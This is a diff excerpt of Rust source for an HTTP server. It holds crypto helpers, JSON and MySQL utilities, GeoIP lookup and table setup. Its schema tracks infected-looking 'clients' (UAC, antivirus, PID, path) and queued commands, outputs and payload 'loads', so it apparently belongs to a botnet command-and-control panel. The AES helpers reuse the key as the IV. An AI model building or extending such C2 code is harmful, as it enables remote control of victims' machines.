+                "(is_uncompleted_load): {}", 
+                e
+            ));
+            false
+        }
+    }
+}
+
+
+// ------------------------ General Functions ------------------------
+
+
+fn get_timestamp() -> u64 {
+    let since_the_epoch = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .expect("Time went backwards lmao");
+    return since_the_epoch.as_secs()
+}
+
+fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Result<String, ErrorStack> {
+    let cipher = Cipher::aes_256_cbc();
+
+    let mut encrypter = Crypter::new(cipher, Mode::Encrypt, key, Some(&key[..16]))?;
+    encrypter.pad(true);
+
+    let mut ciphertext = vec![0; plaintext.len() + cipher.block_size()];
+    let count = encrypter.update(plaintext.as_bytes(), &mut ciphertext)?;
+    let final_count = encrypter.finalize(&mut ciphertext[count..])?;
+
+    ciphertext.truncate(count + final_count);
+    Ok(encode_block(&ciphertext))
+}
+
+
+fn decrypt_string_withkey(ciphertext: &str, key: &[u8]) -> std::result::Result<Vec<u8>, ErrorStack> {
+    let ciphertext = decode_block(ciphertext).unwrap();
+    let cipher = Cipher::aes_256_cbc();
+    let mut decrypter = Crypter::new(cipher, Mode::Decrypt, key, Some(&key[..16]))?;
+    decrypter.pad(true);
+
+    let mut plaintext = vec![0; ciphertext.len() + cipher.block_size()];
+    let count = decrypter.update(&ciphertext, &mut plaintext)?;
+    let final_count = decrypter.finalize(&mut plaintext[count..])?;
+
+    plaintext.truncate(count + final_count);
+    Ok(plaintext)
+}
+
+fn fprint(stype: &str, sformatted: &str) -> () {
+    
+    let color = match stype {
+        "info" => stype.to_uppercase().cyan(),
+        "error" => stype.to_uppercase().red(),
+        "failure" => stype.to_uppercase().red(),
+        "success" => stype.to_uppercase().green(),
+        "task" => stype.to_uppercase().yellow(),
+        _ => stype.to_uppercase().white(),
+    };
+
+    println!("[{} - {}] {}", get_timestamp().to_string().white(), color, sformatted);
+}
+
+
+fn value_to_str(row: &mysql_async::Row, index: usize) -> String {
+    if let Some(value) = row.as_ref(index) {
+        match value {
+            Value::NULL => String::from(""),
+            Value::Bytes(v) => String::from_utf8_lossy(v.as_slice()).into_owned(),
+            Value::Int(v) => format!("{v}"),
+            Value::UInt(v) => format!("{v}"),
+            Value::Float(v) => format!("{v}"),
+            Value::Double(v) => format!("{v}"),
+            Value::Date(_year, _month, _day, _hour, _minutes, _seconds, _micro) => todo!(),
+            Value::Time(_negative, _days, _hours, _minutes, _seconds, _micro) => todo!(),
+        }
+    } else {
+        String::from("")
+    }
+}
+
+fn value_to_u64(row: &mysql_async::Row, index: usize) -> u64 {return value_to_str(row, index).parse::<u64>().unwrap();}
+fn value_to_bool(row: &mysql_async::Row, index: usize) -> bool { match value_to_u64(row, index) {1 => true, 0 => false, _ => panic!("Not a bool")} }
+
+fn key_to_string(json: &serde_json::Value, json_key: &str) -> String {String::from(json[json_key].as_str().unwrap())}
+fn key_to_u64(json: &serde_json::Value, json_key: &str) -> u64 {json[json_key].as_u64().unwrap()}
+fn key_to_bool(json: &serde_json::Value, json_key: &str) -> bool {json[json_key].as_bool().unwrap()}
+fn key_exists(json: &serde_json::Value, json_key:&str) -> bool {if let Some(_) = json.get(json_key) {return true} else {return false}}
+
+fn all_keys_valid(json: &serde_json::Value, keys: Vec<&str>, types: Vec<&str>) -> bool {
+    let mut counter: usize = 0;
+    for key in keys {
+        if let Some(_) = json.get(key) {
+            // Check if key is one of the valid types:
+            if types[counter] == "String" {
+                match json[key].as_str() {
+                    Some(_) => (),
+                    None => return false,
+                };
+            } else if types[counter] == "u64" {
+                match json[key].as_u64() {
+                    Some(_) => (),
+                    None => return false,
+                };
+            } else if types[counter] == "bool" {
+                match json[key].as_bool() {
+                    Some(_) => (),
+                    None => return false,
+                };
+            }
+        } else {
+            return false;
+        }
+        counter += 1;
+    }
+    return true
+}
+
+async fn ip_to_country(ip: &str) -> String {
+    let ip_db = &*IP_DATABASE.read().unwrap();
+    let reader = maxminddb::Reader::from_source(ip_db).unwrap();
+    let ip: IpAddr = ip.parse().unwrap();
+    let country: std::prelude::v1::Result<geoip2::Country, maxminddb::MaxMindDBError> = reader.lookup(ip);
+    match country {
+        Ok(_) => String::from(country.unwrap().country.unwrap().iso_code.unwrap()),
+        Err(_) => String::from("NL")
+    }
+}
+
+
+// ------------------------ HTTP Responses ------------------------
+
+fn resp_unauthorised() -> HttpResponse {
+    return HttpResponse::build(StatusCode::UNAUTHORIZED).body("You do not have the required authorization to complete this request.");
+}
+
+fn resp_badrequest() -> HttpResponse {
+    return HttpResponse::build(StatusCode::BAD_REQUEST).body("Your request was malformed. Check the information you provided alongside this request.");
+}
+
+fn resp_servererror() -> HttpResponse {
+    return HttpResponse::build(StatusCode::INTERNAL_SERVER_ERROR).body("The server is overwhelmed or under maintinence. Retry your request at a later date.");
+}
+
+fn resp_ok(message: String) -> HttpResponse {
+    return HttpResponse::build(StatusCode::OK).body(message);
+}
+
+fn resp_ok_encrypted(message: &str, key: &[u8]) -> HttpResponse {
+    return HttpResponse::build(StatusCode::OK).body(encrypt_string_withkey(message, key).unwrap());
+}
+
+// ------------------------ Init Functions ------------------------
+
+
+async fn initialize_tables(connection_pool: Pool) {
+    let mut connection: Conn = connection_pool.get_conn().await.expect("Unable to connect to database.");
+
+    connection.query_drop(r"
+    
+        SET GLOBAL query_cache_size = 268435455;
+
+    ").await.expect("Failed to init db");
+
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS clients (
+            client_id TEXT,
+            version INTEGER,
+            uac BOOL,
+            ip TEXT,
+            country TEXT,
+            username TEXT,
+            guid TEXT,
+            cpu TEXT,
+            gpu TEXT,
+            ram INTEGER,
+            antivirus TEXT,
+            path TEXT,
+            pid INTEGER,
+            last_seen INTEGER,
+            first_seen INTEGER,
+            encryption_key TEXT
+        )  ENGINE=InnoDB;
+    
+        CREATE INDEX IF NOT EXISTS idx_clients_client_id ON clients (client_id);
+        ").await.expect("clients table creation failed");
+    
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS commands (
+            command_id TEXT,
+            load_id TEXT,
+            client_id TEXT,
+            cmd_type TEXT,
+            cmd_args TEXT,
+            time_issued INT
+        ) ENGINE=InnoDB;
+    
+        CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands (client_id);
+        CREATE INDEX IF NOT EXISTS idx_commands_command_id ON commands (command_id);
+
+        ").await.expect("commands table creation failed");
+    
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS outputs (
+            output_id TEXT,
+            command_id TEXT,
+            client_id TEXT,
+            cmd_args TEXT,
+            cmd_type TEXT,
+            output TEXT,
+            time_issued INT,
+            time_received INT
+        ) ENGINE=InnoDB;
+    
+        CREATE INDEX IF NOT EXISTS idx_outputs_client_id ON outputs (client_id);
+        CREATE INDEX IF NOT EXISTS idx_outputs_command_id ON outputs (command_id);
+        CREATE INDEX IF NOT EXISTS idx_outputs_output_id ON outputs (output_id);
+        ").await.expect("outputs table creation failed");
+    
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS loads (
+            load_id TEXT,
+            required_amount INT,
+            recursive_load BOOL,
+            cmd_args TEXT,
+            cmd_type TEXT,
+            time_issued INT
+        ) ENGINE=InnoDB;
+    
+        CREATE INDEX IF NOT EXISTS idx_loads_load_id ON loads (load_id);
+        ").await.expect("loads table creation failed");
+    
+    connection.query_drop(
+        r"
+        CREATE TABLE IF NOT EXISTS blocks (
+            client_id TEXT,
+            ip TEXT,
+            banned_until INT
+        ) ENGINE=InnoDB;
+    
+        CREATE INDEX IF NOT EXISTS idx_blocks_client_id ON blocks (client_id);
+        CREATE INDEX IF NOT EXISTS idx_blocks_ip ON blocks (ip);
+        ").await.expect("blocks table creation failed");
+    
+    drop(connection);
+}
+
+// ------------------------ Main Program ------------------------
+
+
+#[derive(Debug)]
+enum GenericError {
+    Mysql(Error),
+    NoRows,
+    _WrongData,
+    _ProgramErrored,
+    _Expired
 }
